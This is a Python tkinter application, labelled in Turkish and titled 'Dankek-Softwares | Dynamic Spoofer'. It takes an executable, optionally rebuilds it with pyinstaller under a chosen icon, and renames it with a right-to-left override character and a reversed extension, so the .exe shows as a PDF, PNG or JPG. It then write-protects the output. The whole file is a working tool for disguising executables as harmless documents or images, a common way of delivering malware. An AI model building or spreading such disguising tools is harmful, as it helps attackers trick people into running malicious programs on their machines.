import tkinter as tk
from tkinter import filedialog, messagebox
import os
import subprocess
import shutil
import stat
from PIL import Image, ImageTk

class DankekDynamic:
    def __init__(self, master):
        self.master = master
        self.master.title("Dankek-Softwares | Dynamic Spoofer")
        self.master.geometry("550x480")
        self.master.resizable(False, False)
        
        self.exe_path = tk.StringVar()
        self.ico_path = tk.StringVar()
        self.mode = tk.StringVar(value="fdp")

        try:
            # Arka plan imza görseli
            img = Image.open("imza.png") 
            img = img.resize((550, 480), Image.Resampling.LANCZOS)
            img.putalpha(60) 
            self.bg_img = ImageTk.PhotoImage(img)
            tk.Label(master, image=self.bg_img, bg="#0a0a0a").place(x=0, y=0, relwidth=1, relheight=1)
        except:
            master.configure(bg="#0a0a0a")

        self.panel = tk.Frame(master, bg="#111", bd=1, relief="flat")
        self.panel.place(relx=0.5, rely=0.5, anchor="center", width=460, height=400)

        tk.Label(self.panel, text="DANKEK-SOFTWARES", font=("Consolas", 18, "bold"), 
                 bg="#111", fg="#00ff00").pack(pady=20)

        self.label("Kaynak EXE:")
        f_frame = tk.Frame(self.panel, bg="#111")
        f_frame.pack(pady=5)
        tk.Entry(f_frame, textvariable=self.exe_path, width=38, bg="#222", fg="#00ff00", borderwidth=0).pack(side='left', padx=5, ipady=3)
        tk.Button(f_frame, text="Seç", command=self.get_exe, bg="#333", fg="white").pack(side='left')

        self.label("Görünüm İkonu (Opsiyonel):")
        i_frame = tk.Frame(self.panel, bg="#111")
        i_frame.pack(pady=5)
        tk.Entry(i_frame, textvariable=self.ico_path, width=38, bg="#222", fg="#00ff00", borderwidth=0).pack(side='left', padx=5, ipady=3)
        tk.Button(i_frame, text="Seç", command=self.get_ico, bg="#333", fg="white").pack(side='left')

        tk.Label(self.panel, text="Dönüştürülecek Format:", bg="#111", fg="#555").pack(pady=10)
        opts = tk.Frame(self.panel, bg="#111")
        opts.pack()
        for t, v in [("PDF", "fdp"), ("PNG", "gnp"), ("JPG", "gpj")]:
            tk.Radiobutton(opts, text=t, variable=self.mode, value=v, bg="#111", fg="#00ff00", selectcolor="#111").pack(side='left', padx=20)

        self.btn = tk.Button(self.panel, text="GENERATE & LOCK", command=self.build, 
                             bg="#007acc", fg="white", font=("Arial", 10, "bold"), 
                             width=30, height=2, relief="flat")
        self.btn.pack(pady=30)

    def label(self, t):
        tk.Label(self.panel, text=t, bg="#111", fg="#888", font=("Arial", 9)).pack(anchor="w", padx=40)

    def get_exe(self):
        f = filedialog.askopenfilename(filetypes=[("EXE", "*.exe")])
        if f: self.exe_path.set(f)

    def get_ico(self):
        i = filedialog.askopenfilename(filetypes=[("ICO", "*.ico")])
        if i: self.ico_path.set(i)

    def lock_file(self, path):
        # Yazma koruması ekleyerek değiştirilmesini engeller
        mode = os.stat(path).st_mode
        os.chmod(path, mode & ~stat.S_IWRITE)

    def build(self):
        exe_full_path = self.exe_path.get()
        ico = self.ico_path.get()
        if not exe_full_path: return

        self.btn.config(text="Processing...", state="disabled")
        self.master.update()

        # Dinamik isim yakalama
        folder = os.path.dirname(exe_full_path)
        original_filename = os.path.basename(exe_full_path)
        name_no_ext = os.path.splitext(original_filename)[0]
        
        char, ext_choice = "\u202e", self.mode.get()
        # Orijinal isim + RTLO + Ters uzantı + .exe
        final_name = f"{name_no_ext}{char}{ext_choice}.exe"
        final_path = os.path.join(folder, final_name)
        
        try:
            if ico:
                temp_n = "dankek_gen_tmp"
                cmd = f'pyinstaller --onefile --noconsole --icon="{ico}" --name="{temp_n}" "{exe_full_path}"'
                if subprocess.run(cmd, shell=True).returncode == 0:
                    shutil.move(os.path.join("dist", f"{temp_n}.exe"), final_path)
                    self.lock_file(final_path)
                    self.clean(temp_n)
                    messagebox.showinfo("Başarılı", f"Dosya '{final_name}' olarak kilitlendi!")
            else:
                shutil.copy(exe_full_path, final_path)
                self.lock_file(final_path)
                messagebox.showinfo("Başarılı", f"Dosya orijinal ismiyle manipüle edildi ve kilitlendi!")
                
        except Exception as e:
            messagebox.showerror("Hata", str(e))
        finally:
            self.btn.config(text="GENERATE & LOCK", state="normal")

    def clean(self, n):
        shutil.rmtree("build", ignore_errors=True)
        shutil.rmtree("dist", ignore_errors=True)
        if os.path.exists(f"{n}.spec"): os.remove(f"{n}.spec")

if __name__ == "__main__":
    root = tk.Tk()
    app = DankekDynamic(root)
    root.mainloop()